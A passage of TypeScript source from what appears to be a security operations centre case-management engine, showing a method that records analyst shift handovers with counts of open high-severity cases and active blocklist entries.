    return this.shiftHandovers;
  }

  public createShiftHandover(data: {
    shiftName: string;
    leadAnalyst: string;
    analystsOnDuty: string[];
    handoffNotes: string;
    actionItems: string[];
  }): ShiftHandover {
    const openCases = Array.from(this.cases.values()).filter((c) => c.status !== 'RESOLVED' && c.status !== 'CLOSED');
    const p1p2 = openCases.filter((c) => c.severity === 'P1' || c.severity === 'P2').length;
    const activeBlocks = Array.from(this.blocklist.values()).filter((b) => b.status === 'ACTIVE').length;

    const handover: ShiftHandover = {
      id: `SHIFT-${Date.now().toString().slice(-6)}`,
      shiftName: data.shiftName,
      leadAnalyst: data.leadAnalyst,
      analystsOnDuty: data.analystsOnDuty,
      unresolvedP1P2Count: p1p2,
      activeContainmentsCount: activeBlocks,
      handoffNotes: data.handoffNotes,
      actionItems: data.actionItems,
      handoverTimestampWat: getWATFormattedDate(),
      status: 'ACTIVE',
    };

    this.shiftHandovers.unshift(handover);
    return handover;
  }
}

export const socEngine = new SocEngine();
